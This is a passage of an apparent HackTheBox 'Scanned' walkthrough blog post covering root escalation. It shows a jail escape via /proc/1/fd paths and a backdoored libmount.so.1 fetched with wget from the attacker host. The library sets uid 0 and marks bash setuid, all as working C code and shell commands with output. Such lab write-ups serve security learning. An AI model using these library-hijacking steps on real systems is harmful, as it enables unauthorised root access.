/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/chsh
/usr/bin/su
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/umount
</pre></td></tr></tbody></table></code></div></div>

<p>In this case we choose mount as our target. Using <code class="language-plaintext highlighter-rouge">ldd</code> we can see all the libraries it imports.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>clarence@scanned:/var/www/malscanner/sandbox$ ldd /usr/bin/mount
        linux-vdso.so.1 (0x00007ffe1d1f2000)
        libmount.so.1 =&gt; /lib/x86_64-linux-gnu/libmount.so.1 (0x00007f0af75d4000)
        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f0af740f000)
        libblkid.so.1 =&gt; /lib/x86_64-linux-gnu/libblkid.so.1 (0x00007f0af73be000)
        libselinux.so.1 =&gt; /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f0af7392000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f0af7647000)
        libpcre2-8.so.0 =&gt; /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007f0af72fa000)
        libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f0af72f4000)
        libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f0af72d0000)
</pre></td></tr></tbody></table></code></div></div>

<p>To choose the one we want to backdoor we can run mount from within the sandbox and look at the error message to get the first library missing. To have an interactive process from where we can call <code class="language-plaintext highlighter-rouge">mount</code> one way is to run <code class="language-plaintext highlighter-rouge">sandbox</code> with <code class="language-plaintext highlighter-rouge">/bin/sh</code></p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>clarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /bin/sh 1
$ /proc/1/fd/3/../../../../../../usr/bin/mount /dev/sda /tmp
/proc/1/fd/3/../../../../../../usr/bin/mount: error while loading shared libraries: libmount.so.1: cannot open shared object file: No such file or directory
$ Killed subprocess
</pre></td></tr></tbody></table></code></div></div>

<p>Having identified the library to backdoor we now need to know all the functions inside it. To have better access to it we use scp to copy the library over to our machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>$ scp clarence@10.129.160.252:/lib/x86_64-linux-gnu/libmount.so.1 .
clarence@10.129.160.252's password:
libmount.so.1                                                                                                                                                                                                100%  367KB 225.1KB/s   00:01$
</pre></td></tr></tbody></table></code></div></div>

<p>Using objdump we can retrieve all the functions and with awk we can create a C source file calling each one of them. For the function call we will simply output which function got called so we know what to backdoor.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>$ objdump -T libmount.so.1  | grep 'DF .text'  | awk -F' ' '{print"int " $7"() { puts(\""$7" got called !!\"); return 0; }"}' &gt; evillib.c
</pre></td></tr></tbody></table></code></div></div>

<p>Finally we also add the necessary header files at the top of the source code and compile it to a shared library.</p>

<p><code class="language-plaintext highlighter-rouge">evillib.c</code></p>
<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">"stdio.h"</span><span class="cp">
#include</span> <span class="cpf">"stdlib.h"</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">mnt_context_prepare_mount</span><span class="p">()</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s">"mnt_context_prepare_mount got called !!"</span><span class="p">);</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="kt">int</span> <span class="nf">mnt_context_syscall_called</span><span class="p">()</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s">"mnt_context_syscall_called got called !!"</span><span class="p">);</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="kt">int</span> <span class="nf">mnt_table_set_trailing_comment</span><span class="p">()</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s">"mnt_table_set_trailing_comment got called !!"</span><span class="p">);</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="kt">int</span> <span class="nf">mnt_context_get_target</span><span class="p">()</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s">"mnt_context_get_target got called !!"</span><span class="p">);</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="kt">int</span> <span class="nf">mnt_fs_get_size</span><span class="p">()</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s">"mnt_fs_get_size got called !!"</span><span class="p">);</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="kt">int</span> <span class="nf">mnt_table_get_trailing_comment</span><span class="p">()</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s">"mnt_table_get_trailing_comment got called !!"</span><span class="p">);</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="kt">int</span> <span class="nf">mnt_get_fstype</span><span class="p">()</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s">"mnt_get_fstype got called !!"</span><span class="p">);</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="kt">int</span> <span class="nf">mnt_resolve_spec</span><span class="p">()</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s">"mnt_resolve_spec got called !!"</span><span class="p">);</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>

<span class="p">...[</span><span class="n">snip</span><span class="p">]...</span>
	
<span class="kt">int</span> <span class="nf">mnt_context_disable_mtab</span><span class="p">()</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s">"mnt_context_disable_mtab got called !!"</span><span class="p">);</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="kt">int</span> <span class="nf">mnt_fs_get_target</span><span class="p">()</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s">"mnt_fs_get_target got called !!"</span><span class="p">);</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="kt">int</span> <span class="nf">mnt_update_get_mflags</span><span class="p">()</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s">"mnt_update_get_mflags got called !!"</span><span class="p">);</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="kt">int</span> <span class="nf">mnt_table_parse_swaps</span><span class="p">()</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s">"mnt_table_parse_swaps got called !!"</span><span class="p">);</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="kt">int</span> <span class="nf">mnt_context_set_target_ns</span><span class="p">()</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s">"mnt_context_set_target_ns got called !!"</span><span class="p">);</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="kt">int</span> <span class="nf">mnt_table_parse_stream</span><span class="p">()</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s">"mnt_table_parse_stream got called !!"</span><span class="p">);</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="kt">int</span> <span class="nf">mnt_update_get_filename</span><span class="p">()</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s">"mnt_update_get_filename got called !!"</span><span class="p">);</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="kt">int</span> <span class="nf">mnt_table_last_fs</span><span class="p">()</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s">"mnt_table_last_fs got called !!"</span><span class="p">);</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="kt">int</span> <span class="nf">mnt_split_optstr</span><span class="p">()</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s">"mnt_split_optstr got called !!"</span><span class="p">);</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="kt">int</span> <span class="nf">mnt_context_get_fstype</span><span class="p">()</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s">"mnt_context_get_fstype got called !!"</span><span class="p">);</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>$ gcc -shared -fPIC -o evillib.so evillib.c
</pre></td></tr></tbody></table></code></div></div>

<p>Next we transfer it over to the machine and prepare the command to execute in sh to just paste it later since we are dealing with a limited timeframe.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>clarence@scanned:/var/www/malscanner/sandbox$ wget 10.10.14.75:8000/evillib.so -O /tmp/evillib.so
--2022-02-02 20:41:40--  http://10.10.14.75:8000/evillib.so
Connecting to 10.10.14.75:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 69752 (68K) [application/octet-stream]
Saving to: â€˜/tmp/evillib.soâ€™

/tmp/evillib.so                                             100%[==========================================================================================================================================&gt;]  68.12K  --.-KB/s    in 0.09s

2022-02-02 20:41:40 (755 KB/s) - â€˜/tmp/evillib.soâ€™ saved [69752/69752]
</pre></td></tr></tbody></table></code></div></div>

<p>For the execution we open up another ssh session where we will prepare the copying of the bad library. First we create a variable to hold the uuid for our jail. We do this to keep track which jail names are already blocked currently. Next is a sleep command so we can start the sandbox during the sleep and then the backdoored library gets copied into the created jail.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>clarence@scanned:/var/www/malscanner/sandbox$ UNIQUE=1; sleep 2; cp /tmp/evillib.so /var/www/malscanner/sandbox/jails/$UNIQUE/lib/libmount.so.1
</pre></td></tr></tbody></table></code></div></div>

<p>After we start the command with the sleep we run <code class="language-plaintext highlighter-rouge">/bin/sh</code> inside sandbox on our other ssh session specifying the same uuid.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>clarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /bin/sh 1
$
</pre></td></tr></tbody></table></code></div></div>

<p>Once the copy command finishes we run our prepared mount command inside the sandboxâ€™s <code class="language-plaintext highlighter-rouge">/bin/sh</code>. There are some errors about no version information being available but at the end of the output we see that <code class="language-plaintext highlighter-rouge">mnt_init_debug</code> and <code class="language-plaintext highlighter-rouge">mnt_new_context</code> got called by <code class="language-plaintext highlighter-rouge">mount</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>$ /proc/1/fd/3/../../../../../../usr/bin/mount /dev/sda /tmp
/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)
/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)
/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)
/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)
/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)
/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)
/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)
/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)
/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)
/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)
mnt_init_debug got called !!
mnt_new_context got called !!
mount: libmount context allocation failed: Success
$ Killed subprocess
Exited
</pre></td></tr></tbody></table></code></div></div>

<p>Since <code class="language-plaintext highlighter-rouge">mnt_init_debug</code> got called first we will choose this function to run our code. All it does is set the uid to 0, confirms it got set and the gives bash the suid bit on the system.</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">"stdio.h"</span><span class="cp">
#include</span> <span class="cpf">"stdlib.h"</span><span class="cp">
</span>
<span class="p">...[</span><span class="n">snip</span><span class="p">]...</span>
	
<span class="kt">int</span> <span class="nf">mnt_init_debug</span><span class="p">()</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s">"mnt_init_debug got called !!"</span><span class="p">);</span> <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">printf</span><span class="p">(</span><span class="s">"uid %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">getuid</span><span class="p">());</span> <span class="n">system</span><span class="p">(</span><span class="s">"/proc/1/fd/3/../../../../../../usr/bin/chmod +s /proc/1/fd/3/../../../../../../bin/bash"</span><span class="p">);</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>

<span class="p">...[</span><span class="n">snip</span><span class="p">]...</span>
	
</pre></td></tr></tbody></table></code></div></div>

<p>Now all we have to do is perform the steps from before. First we compile the library again and transfer it over to the target.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>gcc -shared -fPIC -o evillib.so evillib.c
evillib.c: In function â€˜mnt_init_debugâ€™:
evillib.c:19:62: warning: implicit declaration of function â€˜setuidâ€™ [-Wimplicit-function-declaration]
   19 | int mnt_init_debug() { puts("mnt_init_debug got called !!"); setuid(0); printf("uid %d\n", getuid()); system("/proc/1/fd/3/../../../../../../usr/bin/chmod +s /proc/1/fd/3/../../../../../../bin/bash"); return 0; }
      |                                                              ^~~~~~
evillib.c:19:92: warning: implicit declaration of function â€˜getuidâ€™ [-Wimplicit-function-declaration]
   19 | int mnt_init_debug() { puts("mnt_init_debug got called !!"); setuid(0); printf("uid %d\n", getuid()); system("/proc/1/fd/3/../../../../../../usr/bin/chmod +s /proc/1/fd/3/../../../../../../bin/bash"); return 0; }
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>clarence@scanned:/var/www/malscanner/sandbox$ rm /tmp/evillib.so
clarence@scanned:/var/www/malscanner/sandbox$ wget 10.10.14.75:8000/evillib.so -O /tmp/evillib.so
--2022-02-02 20:47:30--  http://10.10.14.75:8000/evillib.so
Connecting to 10.10.14.75:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 69960 (68K) [application/octet-stream]
Saving to: â€˜/tmp/evillib.soâ€™

/tmp/evillib.so                                             100%[==========================================================================================================================================&gt;]  68.32K  --.-KB/s    in 0.09s

2022-02-02 20:47:30 (754 KB/s) - â€˜/tmp/evillib.soâ€™ saved [69960/69960]
</pre></td></tr></tbody></table></code></div></div>

<p>We increment our uuid value so <code class="language-plaintext highlighter-rouge">sandbox</code> does not exit because the jail name exits. Then we run the sleep command first again and start <code class="language-plaintext highlighter-rouge">/bin/sh</code> in the sandbox with the incremented uuid.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>clarence@scanned:/var/www/malscanner/sandbox$ UNIQUE=2; sleep 2; cp /tmp/evillib.so /var/www/malscanner/sandbox/jails/$UNIQUE/lib/libmount.so.1
</pre></td></tr></tbody></table></code></div></div>

<p>Like before we run our prepared mount statement inside the sandbox again after the copy command finished. In the output we can see that the uid of the process running our function is now 0, indicating our backdoored code got executed successfully.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre>clarence@scanned:/var/www/malscanner/sandbox$ ./sandbox /bin/sh 2
$ /proc/1/fd/3/../../../../../../usr/bin/mount /dev/sda /tmp
/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)
/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)
/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)
/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)
/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)
/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)
/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)
/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)
/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)
/proc/1/fd/3/../../../../../../usr/bin/mount: /lib/libmount.so.1: no version information available (required by /proc/1/fd/3/../../../../../../usr/bin/mount)
mnt_init_debug got called !!
uid 0
mnt_new_context got called !!
mount: libmount context allocation failed: Success
$ Killed subprocess
Exited
</pre></td></tr></tbody></table></code></div></div>

<p>Now we can simply drop into a root bash shell and add the root flag to our collection.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>clarence@scanned:/var/www/malscanner/sandbox$ bash -p
bash-5.1# wc -c /root/root.txt
33 /root/root.txt
</pre></td></tr></tbody></table></code></div></div>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  
  <div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i>
    
      <a href='/categories/hackthebox/'>HackTheBox</a>
  </div>
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/linux/"
          class="post-tag no-text-decoration" >linux</a>
      
      <a href="/tags/insane/"
          class="post-tag no-text-decoration" >insane</a>
      
      <a href="/tags/kernel/"
          class="post-tag no-text-decoration" >kernel</a>
      
      <a href="/tags/pwn/"
          class="post-tag no-text-decoration" >pwn</a>
      
      <a href="/tags/c/"
          class="post-tag no-text-decoration" >c</a>
      
      <a href="/tags/coding/"
          class="post-tag no-text-decoration" >coding</a>
      
      <a href="/tags/chroot/"
          class="post-tag no-text-decoration" >chroot</a>
      
      <a href="/tags/jail/"
          class="post-tag no-text-decoration" >jail</a>
      
      <a href="/tags/sandbox/"
          class="post-tag no-text-decoration" >sandbox</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Hack+The+Box+-+Scanned+-+Ankit+Kanojiya&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fscanned%2F" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Hack+The+Box+-+Scanned+-+Ankit+Kanojiya&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fscanned%2F" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fscanned%2F&text=Hack+The+Box+-+Scanned+-+Ankit+Kanojiya" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        data-title-succeed="Link copied successfully!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="ankitkanojiya" data-description="Support me on Buy me a coffee!" data-message="" data-color="#BD5FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- panel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      















      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hacking/">Hacking</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
    
      
      <a class="post-tag" href="/tags/machine/">Machine</a>
    
      
      <a class="post-tag" href="/tags/walkthrough/">Walkthrough</a>
    
      
      <a class="post-tag" href="/tags/medium/">Medium</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/cve/">cve</a>
    
      
      <a class="post-tag" href="/tags/easy/">Easy</a>
    
      
      <a class="post-tag" href="/tags/c/">c</a>
    
      
      <a class="post-tag" href="/tags/chroot/">chroot</a>
    

    </div>
  </div>


    </div>

    
      
      




    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5">
    
      
      <!--
